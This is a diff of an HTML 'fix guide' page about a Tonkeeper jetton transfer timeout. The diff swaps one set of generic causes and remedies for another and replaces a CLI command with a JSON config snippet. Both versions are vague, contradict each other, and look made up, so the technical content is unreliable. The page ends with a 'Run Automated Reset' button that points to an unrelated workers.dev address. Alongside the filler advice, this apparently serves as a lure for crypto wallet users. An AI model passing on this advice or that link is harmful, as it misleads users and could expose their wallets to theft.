@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: -apple-system;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
-        background: #ff7b2c;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,28 +42,32 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
+<li>The user encounters a "Tonkeeper Jetton transfer loop timeout" error message when attempting to transfer jettons, indicating that the transfer process has exceeded the allocated time limit.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a malfunction in the transfer loop mechanism, which is responsible for handling the transfer of Jettons between users. This malfunction can be caused by issues such as network congestion, outdated smart contract versions, or incorrect configuration of the transfer loop parameters.</li>
+<li>This error occurs due to the inability of the Tonkeeper wallet to complete the jetton transfer within the predefined timeout period, often caused by network congestion, high gas fees, or insufficient funds.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Check the network configuration and ensure that it is properly connected to the TON blockchain.</li>
-<li>Update the smart contract version to the latest release.</li>
-<li>Adjust the transfer loop parameters to optimize the transfer process.</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the gas limit for the transaction</li>
+<li>Reduce the number of jettons being transferred to minimize transaction size</li>
+<li>Utilize a custom configuration to bypass the default timeout threshold</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;contract_address&gt;<span class="w"> </span>resumeTransfer<span class="w"> </span><span class="o">{}</span><span class="w"> </span>--abi<span class="w"> </span>TransferManager.abi
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;gasLimit&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">20000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;jettonAmount&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">10</span>
+<span class="p">}</span>
 </code></pre></div>
 
 <p>Prerequisites:
-* A basic understanding of the TON blockchain and its ecosystem.
-* Access to the Tonos-CLI tool.
-* The latest version of the TransferManager.abi file.
-For further troubleshooting, consider using an external console to execute the above commands.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sign-message-clicking-back-button-in-the.html">Metamask Extension Bug Sign Message Clicking Back Button In The</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
+* Tonkeeper wallet installed and configured
+* Sufficient TON coins for gas fees
+* Stable internet connection</p>
+<p>Consider utilizing an external console to execute these commands for more precise control over the transaction parameters.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-native-assets-for-custom-networks.html">Metamask Extension Bug Assets Native Assets For Custom Networks</a></li><li><a href="./archive/2026/06/metamask-extension-bug-swap-and-bridge-fail-on-arbitrum-network.html">Metamask Extension Bug Swap And Bridge Fail On Arbitrum Network</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
